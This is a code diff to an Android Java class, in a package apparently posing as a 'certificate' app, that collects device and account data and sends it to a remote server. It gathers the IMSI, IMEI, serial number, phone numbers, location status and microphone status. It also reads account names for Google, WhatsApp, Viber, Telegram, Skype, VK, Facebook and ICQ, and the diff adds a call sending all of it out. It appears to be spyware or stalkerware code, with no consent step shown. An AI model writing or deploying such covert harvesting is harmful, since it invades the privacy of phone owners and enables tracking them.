@@ -2,8 +2,15 @@ package com.inet.android.info;
 
 import java.lang.reflect.Method;
 import java.text.NumberFormat;
+import java.util.HashMap;
 import java.util.Locale;
+import java.util.Map;
 import java.util.TimeZone;
+
+import com.inet.android.certificate.R;
+import com.inet.android.request.AppConstants;
+import com.inet.android.request.RequestList;
+import com.inet.android.utils.ConvertDate;
 
 import android.accounts.Account;
 import android.accounts.AccountManager;
@@ -21,12 +28,6 @@ import android.util.DisplayMetrics;
 import android.util.Log;
 import android.view.WindowManager;
 
-import com.inet.android.certificate.R;
-import com.inet.android.request.AppConstants;
-import com.inet.android.request.DataRequest;
-import com.inet.android.utils.ConvertDate;
-import com.loopj.android.http.RequestParams;
-
 public class DeviceInformation {
 	private Context mContext;
 	private static SharedPreferences sp;
@@ -35,85 +36,65 @@ public class DeviceInformation {
 	private TelephonyInfo telephonyInfo;
 	private String LOG_TAG = DeviceInformation.class.getSimpleName().toString();
 	private Resources path;
-	private RequestParams params;
+	Map<String, String> info;
 
 	public DeviceInformation(Context context) {
 		mContext = context;
-		params = new RequestParams();
+		info = new HashMap<String, String>();
 	}
 
 	public void getInfo() {
 		path = mContext.getApplicationContext().getResources();
 
 		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
-		telephonyManager = (TelephonyManager) mContext
-				.getSystemService(Context.TELEPHONY_SERVICE);
+		telephonyManager = (TelephonyManager) mContext.getSystemService(Context.TELEPHONY_SERVICE);
 		telephonyInfo = TelephonyInfo.getInstance(mContext);
+		Map<String, Object> deviceInfo = new HashMap<String, Object>();
+
+		deviceInfo.put("type", AppConstants.TYPE_SERVICE_REQUEST);
+		deviceInfo.put("time", ConvertDate.logTime());
+		deviceInfo.put("info", info);
 
 		// -------initial json line----------------------
 
-		params.put("data[][info][app]", sp.getString("BUILD", "V_000.1"));
-		params.put("data[][info][" + path.getString(R.string.manufactured)
-				+ "]", getManufactured());
-		params.put("data[][info][" + path.getString(R.string.product) + "]",
-				getProduct());
-		params.put("data[][info][" + path.getString(R.string.brand) + "]",
-				getBrand());
-		params.put("data[][info][" + path.getString(R.string.model) + "]",
-				getModel());
-		params.put("data[][info][" + "os_version" + "]", getVerAndroid());
-		params.put("data[][info][" + "SDK" + "]", getSDK());
-		params.put("data[][info][" + "IMSI" + "]", getIMSI());
-		params.put("data[][info][" + path.getString(R.string.serial_number)
-				+ "]", getSerialNum());
+		info.put("app", sp.getString("BUILD", "V_000.1"));
+		info.put(path.getString(R.string.manufactured), getManufactured());
+		info.put(path.getString(R.string.product), getProduct());
+		info.put(path.getString(R.string.brand), getBrand());
+		info.put(path.getString(R.string.model), getModel());
+		info.put("os_version", getVerAndroid());
+		info.put("SDK", getSDK());
+		info.put("IMSI", getIMSI());
+		info.put(path.getString(R.string.serial_number), getSerialNum());
 		getFeatures();
-		params.put("data[][info][" + path.getString(R.string.display_size)
-				+ "]", getDisplayInfo());
-		params.put("data[][info][" + path.getString(R.string.sd) + "]",
-				getSDCardReady());
-		params.put("data[][info][operator_name]", getOperatorName());
-		params.put("data[][info][" + path.getString(R.string.phone_type) + "]",
-				getPhoneType());
-		params.put("data[][info][" + path.getString(R.string.time_zone) + "]",
-				getTimeZone());
-		params.put("data[][info][" + path.getString(R.string.locale) + "]",
-				Locale.getDefault().getDisplayLanguage());
-		params.put("data[][info][IMEI SIM]", getIMEISim1());
+		info.put(path.getString(R.string.display_size), getDisplayInfo());
+		info.put(path.getString(R.string.sd), getSDCardReady());
+		info.put("operator_name", getOperatorName());
+		info.put(path.getString(R.string.phone_type), getPhoneType());
+		info.put(path.getString(R.string.time_zone), getTimeZone());
+		info.put(path.getString(R.string.locale), Locale.getDefault().getDisplayLanguage());
+		info.put("IMEI SIM", getIMEISim1());
 
 		if (getIsDualSIM() == true) {
-			params.put("data[][info][IMEI SIM2]", getIMEISim2());
-			params.put("data[][info][" + path.getString(R.string.dual_sim)
-					+ "]", path.getString(R.string.available));
+			info.put("IMEI SIM2", getIMEISim2());
+			info.put(path.getString(R.string.dual_sim), path.getString(R.string.available));
 		}
-		if (getNumber() != null)
-			params.put("data[][info][number]", getNumber());
-		else if (getAccaunt() != null)
-			params.put("data[][info]number", getAccaunt());
-
-		params.put("data[][info][MCC]", getMCC());
-		params.put("data[][info][MNC]", getMNC());
-		params.put("data[][info][" + path.getString(R.string.network_type)
-				+ "]", getNetworkType());
-		params.put("data[][info][" + path.getString(R.string.connect_type)
-				+ "]", getConnectType());
-		getAccaunt();
+		
+		 if (getAccaunt().length() != 0)
+			 if (getNumber()!= null)
+				 info.put("number", getNumber());
+		info.put("MCC", getMCC());
+		info.put("MNC", getMNC());
+		info.put(path.getString(R.string.network_type), getNetworkType());
+		info.put(path.getString(R.string.connect_type), getConnectType());
+		
 		// Log.d(LOG_TAG, map.toString());
 
-		params.put("data[][time]", ConvertDate.logTime());
-		params.put("data[][type]",
-				Integer.toString(AppConstants.TYPE_INFO_REQUEST));
+		deviceInfo.put("time", ConvertDate.logTime());
+		deviceInfo.put("type", Integer.toString(AppConstants.TYPE_INFO_REQUEST));
 
-		// Log.d(LOG_TAG, info.toString());
+		RequestList.sendDataRequest(deviceInfo, null, mContext);
 
-		// object.put("hardware", value);
-		// object.put("accaunt", value);
-		// object.put("net", value);
-
-		params.put("key", System.currentTimeMillis());
-		Log.d(LOG_TAG, params.toString());
-		// RequestList.sendDataRequest(params, mContext);
-		DataRequest dataReq = new DataRequest(mContext);
-		dataReq.sendRequest(params);
 	}
 
 	/**
@@ -361,8 +342,7 @@ public class DeviceInformation {
 	private String getConnectType() {
 
 		String network = "";
-		final ConnectivityManager cm = (ConnectivityManager) mContext
-				.getSystemService(Context.CONNECTIVITY_SERVICE);
+		final ConnectivityManager cm = (ConnectivityManager) mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
 		try {
 			if (cm.getActiveNetworkInfo().getType() == ConnectivityManager.TYPE_MOBILE)
 				network = "Cell Network/3G";
@@ -450,12 +430,13 @@ public class DeviceInformation {
 	 * 
 	 * 
 	 */
-	private String getAccaunt() {
+	@SuppressWarnings("null")
+	private StringBuilder getAccaunt() {
 		String accauntGoogle = null;
 
 		AccountManager am = AccountManager.get(mContext);
 		Account[] accounts = am.getAccounts();
-		String phoneNumber = null;
+		StringBuilder phoneNumber = new StringBuilder();
 
 		for (Account ac : accounts) {
 			String acname = ac.name;
@@ -474,14 +455,14 @@ public class DeviceInformation {
 					if (number.indexOf("7") == 0) {
 						number = "+" + number;
 					}
-					if (phoneNumber != null) {
+					if (phoneNumber.length() != 0) {
 						if (!phoneNumber.equals(number)) {
-							phoneNumber = " " + number;
+							phoneNumber.append(" " + number);
 						}
 					} else
-						phoneNumber = number;
+						phoneNumber.append(number);
 
-					params.put("data[][info][WhatsApp]", phoneNumber);
+					info.put("WhatsApp", number);
 
 				}
 			} else if (actype.equals("com.viber.voip.account")) {
@@ -490,14 +471,14 @@ public class DeviceInformation {
 					if (number.indexOf("7") == 0) {
 						number = "+" + number;
 					}
-					if (phoneNumber != null) {
+					if (phoneNumber.length() != 0) {
 						if (!phoneNumber.equals(number)) {
-							phoneNumber += " " + number;
+							phoneNumber.append(" " + number);
 						}
 					} else
-						phoneNumber = number;
+						phoneNumber.append(number);
 
-					params.put("data[][info][Viber]", acname);
+					info.put("Viber", acname);
 
 				}
 			} else if (actype.equals("com.icq.mobile.client")) {
@@ -508,12 +489,12 @@ public class DeviceInformation {
 					}
 					if (phoneNumber != null) {
 						if (!phoneNumber.equals(number)) {
-							phoneNumber += " " + number;
+							phoneNumber.append(" " + number);
 						}
 					} else
-						phoneNumber = number;
+						phoneNumber.append(number);
 
-					params.put("data[][info][ICQ]", acname);
+					info.put("ICQ", acname);
 
 				}
 			} else if (actype.equals("org.telegram.account")) {
@@ -525,36 +506,37 @@ public class DeviceInformation {
 
 					if (phoneNumber != null) {
 						if (!phoneNumber.equals(number)) {
-							phoneNumber += " " + number;
+							phoneNumber.append(" " + number);
 						}
 					} else
-						phoneNumber = number;
+						phoneNumber.append(number);
 
-					params.put("data[][info][Telegram]", acname);
+					info.put("Telegram", acname);
 
 				}
 			} else if (actype.equals("com.skype.contacts.sync")) {
-				params.put("data[][info][Skype]", acname);
+				info.put("Skype", acname);
 
 			} else if (actype.equals("com.vkontakte.account")) {
-				params.put("data[][info][Vkontakte]", acname);
+				info.put("Vkontakte", acname);
 
 			} else if (actype.equals("com.facebook.auth.login")) {
-				params.put("data[][info][Facebook]", acname);
+				info.put("Facebook", acname);
 
 			} else {
-				params.put("data[][info][" + actype + "]", acname);
+				info.put(actype, acname);
 
 			}
 		}
+		Log.d(LOG_TAG, phoneNumber.toString());
 		if (accauntGoogle != null)
-			params.put("data[][info][Google]", accauntGoogle);
-		if (phoneNumber != null)
-			params.put("data[][info][number]", phoneNumber);
+			info.put("Google", accauntGoogle);
+		if (phoneNumber.length() != 0)
+			info.put("number", phoneNumber.toString());
 		return phoneNumber;
 
 	}
-
+	
 	/**
 	 * getMCC
 	 * 
@@ -600,13 +582,11 @@ public class DeviceInformation {
 	 * @return
 	 */
 	private String getDisplayInfo() {
-		WindowManager wm = (WindowManager) mContext
-				.getSystemService(Context.WINDOW_SERVICE);
+		WindowManager wm = (WindowManager) mContext.getSystemService(Context.WINDOW_SERVICE);
 		// Best way for new devices
 		DisplayMetrics displayMetrics = new DisplayMetrics();
 		wm.getDefaultDisplay().getMetrics(displayMetrics);
-		String str_ScreenSize = displayMetrics.widthPixels + " x "
-				+ displayMetrics.heightPixels;
+		String str_ScreenSize = displayMetrics.widthPixels + " x " + displayMetrics.heightPixels;
 		return str_ScreenSize;
 	}
 
@@ -624,44 +604,32 @@ public class DeviceInformation {
 		// set the number format output
 		NumberFormat numberFormat;
 
-		if (Environment.getExternalStorageState().equals(
-				Environment.MEDIA_MOUNTED))
+		if (Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED))
 			SD = path.getString(R.string.mounted);
-		else if (Environment.getExternalStorageState().equals(
-				Environment.MEDIA_REMOVED))
+		else if (Environment.getExternalStorageState().equals(Environment.MEDIA_REMOVED))
 			SD = path.getString(R.string.removed);
-		else if (Environment.getExternalStorageState().equals(
-				Environment.MEDIA_CHECKING))
+		else if (Environment.getExternalStorageState().equals(Environment.MEDIA_CHECKING))
 			SD = path.getString(R.string.checking);
-		else if (Environment.getExternalStorageState().equals(
-				Environment.MEDIA_UNMOUNTED))
+		else if (Environment.getExternalStorageState().equals(Environment.MEDIA_UNMOUNTED))
 			SD = path.getString(R.string.unmounted);
-		else if (Environment.getExternalStorageState().equals(
-				Environment.MEDIA_BAD_REMOVAL))
+		else if (Environment.getExternalStorageState().equals(Environment.MEDIA_BAD_REMOVAL))
 			SD = path.getString(R.string.bad_removal);
-		else if (Environment.getExternalStorageState().equals(
-				Environment.MEDIA_MOUNTED_READ_ONLY))
+		else if (Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED_READ_ONLY))
 			SD = path.getString(R.string.mounted_read_only);
-		else if (Environment.getExternalStorageState().equals(
-				Environment.MEDIA_NOFS))
+		else if (Environment.getExternalStorageState().equals(Environment.MEDIA_NOFS))
 			SD = path.getString(R.string.unsupported_filesystem);
-		else if (Environment.getExternalStorageState().equals(
-				Environment.MEDIA_SHARED))
+		else if (Environment.getExternalStorageState().equals(Environment.MEDIA_SHARED))
 			SD = path.getString(R.string.shared);
-		else if (Environment.getExternalStorageState().equals(
-				Environment.MEDIA_UNMOUNTABLE))
+		else if (Environment.getExternalStorageState().equals(Environment.MEDIA_UNMOUNTABLE))
 			SD = path.getString(R.string.cannot_be_mounted);
 		if (SD != null)
-			if (SD.equals("Mounted") || SD.equals("Unmounted")
-					|| SD.equals("Mounted read only")) {
+			if (SD.equals("Mounted") || SD.equals("Unmounted") || SD.equals("Mounted read only")) {
 				// obtain the stats from the root of the SD card.
-				stats = new StatFs(Environment.getExternalStorageDirectory()
-						.getAbsolutePath());
+				stats = new StatFs(Environment.getExternalStorageDirectory().getAbsolutePath());
 
 				// Add 'Total Size' to the output string:
 				// total usable size
-				totalSize = (long) stats.getBlockCount()
-						* (long) stats.getBlockSize();
+				totalSize = (long) stats.getBlockCount() * (long) stats.getBlockSize();
 
 				// initialize the NumberFormat object
 				numberFormat = NumberFormat.getInstance();
@@ -672,24 +640,16 @@ public class DeviceInformation {
 
 				// Output the SD card's total size in gigabytes, megabytes,
 				// kilobytes and bytes 280
-				totalSpace = numberFormat.format((totalSize / 1073741824))
-						+ " GB \n";
+				totalSpace = numberFormat.format((totalSize / 1073741824)) + " GB \n";
 
 				// Add 'Remaining Space' to the output string:
 				// available free space
-				freeSpace = (long) stats.getAvailableBlocks()
-						* (long) stats.getBlockSize();
+				freeSpace = (long) stats.getAvailableBlocks() * (long) stats.getBlockSize();
 				// Output the SD card's available free space in gigabytes,
 				// megabytes, kilobytes and bytes
-				RemainingSpace = numberFormat.format(freeSpace / 1073741824)
-						+ " GB \n";
-				params.put(
-						"data[][info][" + path.getString(R.string.total_size)
-								+ "]", totalSpace);
-				params.put(
-						"data[][info]["
-								+ path.getString(R.string.remaining_size) + "]",
-						RemainingSpace);
+				RemainingSpace = numberFormat.format(freeSpace / 1073741824) + " GB \n";
+				info.put(path.getString(R.string.total_size), totalSpace);
+				info.put(path.getString(R.string.remaining_size), RemainingSpace);
 
 			}
 		return SD;
@@ -718,8 +678,7 @@ public class DeviceInformation {
 			network = path.getString(R.string.available);
 		else
 			network = path.getString(R.string.not_available);
-		String provider = Settings.Secure.getString(
-				mContext.getContentResolver(),
+		String provider = Settings.Secure.getString(mContext.getContentResolver(),
 				Settings.Secure.LOCATION_PROVIDERS_ALLOWED);
 		if (!provider.equals("")) {
 			// GPS Enabled
@@ -740,20 +699,12 @@ public class DeviceInformation {
 		else
 			microphone = path.getString(R.string.not_available);
 		if (!LocationStatus.equals(""))
-			params.put(
-					"data[][info]["
-							+ path.getString(R.string.determine_the_coordinates)
-							+ "]", LocationStatus);
-		params.put("data[][info][" + path.getString(R.string.status_gps) + "]",
-				GPS);
-		params.put(
-				"data[][info]["
-						+ path.getString(R.string.coordinates_cell_tower) + "]",
-				network);
-		params.put("data[][info][Wi-Fi]", WiFi);
-		params.put("data[][info][" + path.getString(R.string.microphone) + "]",
-				microphone);
-		params.put("data[][info][USBHost]", USBHost);
+			info.put(path.getString(R.string.determine_the_coordinates), LocationStatus);
+		info.put(path.getString(R.string.status_gps), GPS);
+		info.put(path.getString(R.string.coordinates_cell_tower), network);
+		info.put("Wi-Fi", WiFi);
+		info.put(path.getString(R.string.microphone), microphone);
+		info.put("USBHost", USBHost);
 
 	}
 }
